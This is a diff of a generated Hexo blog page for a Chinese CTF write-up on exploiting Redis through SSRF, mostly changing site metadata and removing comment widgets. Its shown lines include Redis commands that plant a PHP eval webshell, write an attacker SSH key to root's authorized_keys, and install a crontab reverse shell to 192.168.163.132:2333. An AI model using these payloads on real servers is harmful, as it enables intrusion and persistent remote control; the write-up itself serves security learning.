@@ -10,13 +10,7 @@
 
     <!--Description-->
     
-        <meta name="description" content="redis协议分析tcpdump抓包
-tcpdump -i lo port 6379 -w redis.pcap在redis执行如下命令
-127.0.0.1:6379&amp;gt; set name test
-OK
-127.0.0.1:6379&amp;gt; get name
-&amp;quot;test&amp;quot;
-">
+        <meta name="description" content="对未来的最大慷慨，就是把一切都献给现在！">
     
 
     <!--Author-->
@@ -31,9 +25,11 @@ OK
 
     <!--Open Graph Description-->
     
+        <meta property="og:description" content="对未来的最大慷慨，就是把一切都献给现在！">
+    
 
     <!--Open Graph Site Name-->
-    <meta property="og:site_name" content="Hexo">
+    <meta property="og:site_name" content="Luc1fer&#39;blog">
 
     <!--Type page-->
     
@@ -48,7 +44,7 @@ OK
 
     <!-- Title -->
     
-    <title>redis与ssrf - Hexo</title>
+    <title>redis与ssrf - Luc1fer&#39;blog</title>
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
@@ -96,12 +92,6 @@ OK
             <li class="menu-item">
                 <a href="/archives">
                     Archives
-                </a>
-            </li>
-            
-            <li class="menu-item">
-                <a href="/about.html">
-                    About
                 </a>
             </li>
             
@@ -155,8 +145,6 @@ OK
                 <span class="date">2019-08-10</span>
             
             
-                <a href="#disqus_thread" class="comments">Comments</a>
-            
             
                 <span class="category">
                     <a href="/categories/ctf/">ctf</a>
@@ -171,7 +159,8 @@ OK
         
 
         <!-- Post Content -->
-        <a id="more"></a>
+        <p>wula!<br>我爱学习！🤫</p>
+<a id="more"></a>
 
 <h1 id="redis协议分析"><a href="#redis协议分析" class="headerlink" title="redis协议分析"></a>redis协议分析</h1><p>tcpdump抓包</p>
 <pre><code>tcpdump -i lo port 6379 -w redis.pcap</code></pre><p>在redis执行如下命令</p>
@@ -209,7 +198,7 @@ OK
 </ol>
 <h3 id="绝对路径写webshell"><a href="#绝对路径写webshell" class="headerlink" title="绝对路径写webshell"></a>绝对路径写webshell</h3><p>构造redis命令</p>
 <pre><code>flushall
-set 1 &#39;&lt;?php eval($_GET[&quot;cmd&quot;]);?&gt;&#39;
+set 1 &apos;&lt;?php eval($_GET[&quot;cmd&quot;]);?&gt;&apos;
 config set dir /var/www/html
 config set dbfilename shell.php
 save</code></pre><p>转换为redis RESP格式</p>
@@ -249,8 +238,8 @@ if __name__==&quot;__main__&quot;:
 <h3 id="写ssh公钥"><a href="#写ssh公钥" class="headerlink" title="写ssh公钥"></a>写ssh公钥</h3><p>如果<code>.ssh</code>目录存在，则直接写入<code>~/.ssh/authorized_keys</code><br>如果不存在，则可以利用<code>crontab</code>创建该目录</p>
 <p>构造redis命令</p>
 <pre><code>flushall
-set 1 &#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGd9qrfBQqsml+aGC/PoXsKGFhW3sucZ81fiESpJ+HSk1ILv+mhmU2QNcopiPiTu+kGqJYjIanrQEFbtL+NiWaAHahSO3cgPYXpQ+lW0FQwStEHyDzYOM3Jq6VMy8PSPqkoIBWc7Gsu6541NhdltPGH202M7PfA6fXyPR/BSq30ixoAT1vKKYMp8+8/eyeJzDSr0iSplzhKPkQBYquoiyIs70CTp7HjNwsE2lKf4WV8XpJm7DHSnnnu+1kqJMw0F/3NqhrxYK8KpPzpfQNpkAhKCozhOwH2OdNuypyrXPf3px06utkTp6jvx3ESRfJ89jmuM9y4WozM3dylOwMWjal root@kali
-&#39;
+set 1 &apos;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGd9qrfBQqsml+aGC/PoXsKGFhW3sucZ81fiESpJ+HSk1ILv+mhmU2QNcopiPiTu+kGqJYjIanrQEFbtL+NiWaAHahSO3cgPYXpQ+lW0FQwStEHyDzYOM3Jq6VMy8PSPqkoIBWc7Gsu6541NhdltPGH202M7PfA6fXyPR/BSq30ixoAT1vKKYMp8+8/eyeJzDSr0iSplzhKPkQBYquoiyIs70CTp7HjNwsE2lKf4WV8XpJm7DHSnnnu+1kqJMw0F/3NqhrxYK8KpPzpfQNpkAhKCozhOwH2OdNuypyrXPf3px06utkTp6jvx3ESRfJ89jmuM9y4WozM3dylOwMWjal root@kali
+&apos;
 config set dir /root/.ssh/
 config set dbfilename authorized_keys
 save</code></pre><p>改第一个脚本</p>
@@ -260,7 +249,7 @@ path=&quot;/root/.ssh/&quot;</code></pre><p>还是用curl打一发</p>
 <h3 id="利用contrab计划反弹shell"><a href="#利用contrab计划反弹shell" class="headerlink" title="利用contrab计划反弹shell"></a>利用contrab计划反弹shell</h3><p>Centos的定时任务在<code>/var/spool/cron/&lt;username&gt;</code>和/etc/crontab，高版本redis默认启动是redis权限，故无法实现</p>
 <p>构造redis命令</p>
 <pre><code>flushall
-set 1 &#39;\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.163.132/2333 0&gt;&amp;1\n\n&#39;
+set 1 &apos;\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.163.132/2333 0&gt;&amp;1\n\n&apos;
 config set dir /var/spool/cron/
 config set dbfilename root
 save</code></pre><p>改第一个命令</p>
@@ -279,21 +268,11 @@ path=&quot;/var/spool/cron&quot;</code></pre><h1 id="参考链接"><a href="#参
     
         <div class="post-tags">
             <i class="fa fa-tags" aria-hidden="true"></i>
-            <a href="/tags/ssrf/">#ssrf</a> <a href="/tags/redis/">#redis</a>
+            <a href="/tags/redis/">#redis</a> <a href="/tags/ssrf/">#ssrf</a>
         </div>
     
 
     <!-- Comments -->
-    
-    <div class="comments">
-        
-<div id="disqus_thread">
-    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-</div>
-
-
-
-    </div>
     
 
 </div>
@@ -314,7 +293,7 @@ path=&quot;/var/spool/cron&quot;</code></pre><h1 id="参考链接"><a href="#参
             <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
                 <h2>About</h2>
                 <p>
-                    This theme was developed by <a href="https://github.com/klugjo">Jonathan Klughertz</a>. The source code is available on Github. Create Websites. Make Magic.
+                    This theme was developed by <a href="">Jonathan Klughertz</a>. The source code is available on Github. Create Websites. Make Magic.
                 </p>
             </div>
             
@@ -335,7 +314,7 @@ path=&quot;/var/spool/cron&quot;</code></pre><h1 id="参考链接"><a href="#参
             </li>
             
             <li>
-                <a class="footer-post" href="/2019/08/19/Black_magic/">black_magic</a>
+                <a class="footer-post" href="/2019/08/19/Black-magic/">black_magic</a>
             </li>
             
         </ul>
@@ -353,11 +332,11 @@ path=&quot;/var/spool/cron&quot;</code></pre><h1 id="参考链接"><a href="#参
         </li>
         
         <li>
-            <a class="footer-post" href="/categories/wp/">wp</a>
+            <a class="footer-post" href="/categories/docker/">docker</a>
         </li>
         
         <li>
-            <a class="footer-post" href="/categories/docker/">docker</a>
+            <a class="footer-post" href="/categories/wp/">wp</a>
         </li>
         
         <li>
@@ -433,18 +412,6 @@ path=&quot;/var/spool/cron&quot;</code></pre><h1 id="参考链接"><a href="#参
 <script src="/js/main.js"></script>
 
 <!-- Disqus Comments -->
-
-<script type="text/javascript">
-    var disqus_shortname = 'klugjotest';
-
-    (function(){
-        var dsq = document.createElement('script');
-        dsq.type = 'text/javascript';
-        dsq.async = true;
-        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
-        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
-    }());
-</script>
 
 
 
